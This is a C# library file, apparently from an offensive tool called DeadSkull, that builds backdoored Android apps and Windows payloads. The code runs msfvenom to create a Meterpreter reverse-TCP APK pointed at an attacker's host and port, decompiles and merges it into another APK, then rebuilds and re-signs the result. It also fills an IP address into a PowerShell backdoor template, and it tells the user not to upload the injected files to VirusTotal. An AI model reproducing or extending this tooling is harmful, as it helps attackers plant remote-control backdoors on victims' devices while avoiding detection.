using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Xml.Linq;

namespace DeadSkull_Lib
{
    public class Android_Backdoor
    {
        public static void GenerateBackdoorApk(string lhost, string lport)
        {
            // Set the path to the output APK file
            string apkPath = @"C:\DeadSkull\Temp\Backdoor.apk";

            // Create the batch file content
            string batchContent = $@"@echo off
msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > ""{apkPath}""
pause";

            // Set the path to the batch file
            string batchFilePath = Path.Combine(Path.GetTempPath(), "msfvenom.bat");

            // Write the batch file content to the file
            File.WriteAllText(batchFilePath, batchContent);

            // Create a new process to execute the batch file
            Process process = new Process();
            process.StartInfo.FileName = batchFilePath;
            process.StartInfo.UseShellExecute = true;
            process.Start();

            // Wait for the process to exit
            process.WaitForExit();
        } //Generate Without Metasploit

        public static void ExtractApkFile(string apkFilePath, string outputDirectory)
        {
            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = "C:\\DeadSkull\\Lib\\7z\\7z.exe",
                Arguments = $"e {apkFilePath} -o{outputDirectory}"
            };

            using (var process = new Process { StartInfo = startInfo })
            {
                process.Start();
                process.WaitForExit();
            }
        }

        public static void DecompileBackdoorApk()
        {
            // Set the path to the APK file
            string apkPath = @"C:\DeadSkull\Temp\Backdoor.apk";

            // Set the path to the output folder
            string outputPath = @"C:\DeadSkull\Temp";

            // Create a new directory for the decompiled APK
            string apkName = Path.GetFileNameWithoutExtension(apkPath);
            string decompilePath = Path.Combine(outputPath, apkName);
            Directory.CreateDirectory(decompilePath);

            // Set the path to the ApkTool jar file
            string apkToolPath = @"C:\DeadSkull\apktool.jar";

            // Create the command to run ApkTool
            string command = $@"java -jar ""{apkToolPath}"" d -f ""{apkPath}"" -o ""{decompilePath}""";

            // Create a new process to run the command
            ExecuteCommand(command);
        }

        public static void DecompileApk(string apkPath)
        {
            // Set the path to the output folder
            string outputPath = @"C:\DeadSkull\Temp";

            // Create a new directory for the decompiled APK
            var apkName = Path.GetFileNameWithoutExtension(apkPath);
            string decompilePath = Path.Combine(outputPath, apkName);
            Directory.CreateDirectory(decompilePath);

            // Set the path to the ApkTool jar file
            string apkToolPath = @"C:\DeadSkull\apktool.jar";

            // Create the command to run ApkTool
            string command = $@"java -jar ""{apkToolPath}"" d -f ""{apkPath}"" -o ""{decompilePath}""";

            // Create a new process to run the command
            ExecuteCommand(command);
        }

        public static void DeleteFilesWithSuffix(string directoryPath, string suffix)
        {
            if (!Directory.Exists(directoryPath))
            {
                Console.WriteLine("Directory does not exist.");
                return;
            }

            var files = Directory.EnumerateFiles(directoryPath)
                                 .Where(file => file.EndsWith(suffix));

            foreach (string file in files)
            {
                File.Delete(file);
            }
        }

        public static void CopyFilesRecursively(string sourcePath, string targetPath)
        {
            //Now Create all of the directories
            foreach (string dirPath in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
            {
                Directory.CreateDirectory(dirPath.Replace(sourcePath, targetPath));
            }
            //Copy all the files & Replaces any files with the same name
            foreach (string newPath in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
            {
                File.Copy(newPath, newPath.Replace(sourcePath, targetPath), true);
            }
        }

        public static void CopyXml(string firstFilePath, string secondFilePath, string elementName)
        {
            var xDoc1 = XDocument.Load(firstFilePath);
            var xDoc2 = XDocument.Load(secondFilePath);

            var doc1Entries = xDoc1.Descendants(elementName);

            // This will clone the entries from the first document
            var clonedEntries = doc1Entries.Select(x => new XElement(x));

            // This will add the cloned entries to the second document
            xDoc2.Descendants(elementName).Last().AddAfterSelf(clonedEntries);

            // Save the changes to the second document
            xDoc2.Save(secondFilePath);
        }

        public static void RecompileAPK(string apkToolPath, string apkFolderPath, string outputApkPath)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "java";
            startInfo.Arguments = $"-jar {apkToolPath} b {apkFolderPath} -o {outputApkPath}";
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;

            Process process = new Process();
            process.StartInfo = startInfo;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            process.WaitForExit();

            Console.WriteLine("Output: " + output);
            Console.WriteLine("Error: " + error);
        }

        public static void CreateApkFile(string directoryPath, string apkOutputPath)
        {
            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = "C:\\DeadSkull\\Lib\\7z\\7z.exe",
                Arguments = $"a -tzip {apkOutputPath} {directoryPath}\\*"
            };

            using (var process = new Process { StartInfo = startInfo })
            {
                process.Start();
                process.WaitForExit();
            }
        }

        public static void CheckAndSignApkWithApksigner(string apkPath)
        {
            string homePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string androidDebugKeystorePath = Path.Combine(homePath, ".android", "debug.keystore");
            string keystorePassword = "android";
            string keyAlias = "androiddebugkey";
            string keyPassword = "android";

            // Check for ~/.android/debug.keystore for signing
            Console.WriteLine("Checking for ~/.android/debug.keystore for signing");
            if (!File.Exists(androidDebugKeystorePath))
            {
                Console.WriteLine("Debug key not found. Generating one now.");
                if (!Directory.Exists(Path.GetDirectoryName(androidDebugKeystorePath)))
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(androidDebugKeystorePath));
                }

                // Generate the debug keystore
                ExecuteCommand($"keytool -genkey -v -keystore \"{androidDebugKeystorePath}\" -storepass {keystorePassword} -alias {keyAlias} -keypass {keyPassword} -keyalg RSA -keysize 2048 -validity 10000");
            }

            // Attempting to sign the package with your android debug key using apksigner
            Console.WriteLine("Attempting to sign the package with your android debug key using apksigner");
            ExecuteCommand($"apksigner sign --ks \"{androidDebugKeystorePath}\" --ks-key-alias {keyAlias} --ks-pass pass:{keystorePassword} --key-pass pass:{keyPassword} \"{apkPath}\"");

            // Signed the .apk file with ~/.android/debug.keystore using apksigner
            Console.WriteLine("Signed the .apk file with ~/.android/debug.keystore using apksigner");

            // Cleaning up
            Console.WriteLine("Cleaning up");
            if (Environment.GetEnvironmentVariable("DEBUG") != "1")
            {
                Directory.Delete("/tmp/payload", true);
            }

            // Finished generating the payload.
            Console.WriteLine("Finished generating the payload.");

            // Please do not upload the washed/injected files to VirusTotal.com
            Console.WriteLine("Please do not upload files to VirusTotal.com");
        }

        private static void ExecuteCommand(string command)
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C {command}",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            process.Start();
            process.WaitForExit();
        }
    }

    public class Windows_Backdoor
    {
        public void WriteFileFromPowerShellTemplate(string templateFilePath, string newFilePath)
        {
            // Check if the template file exists
            if (!File.Exists(templateFilePath))
            {
                throw new FileNotFoundException("Template file not found.");
            }

            // Read the content of the template file
            string templateContent = File.ReadAllText(templateFilePath);

            // Process the template content
            string newFileContent = ProcessTemplateContent(templateContent);

            // Write the processed content to the new file
            File.WriteAllText(newFilePath, newFileContent);
        }

        private string ProcessTemplateContent(string templateContent)
        {
            // Replace the '<ip>' placeholder with the user's ip input
            string ip = Console.ReadLine();
            string newContent = Regex.Replace(templateContent, "<ip>", ip);
            return newContent;
        }
    }

    public class Linux_Backdoor
    {
    }

    public class ATM
    {
    }
}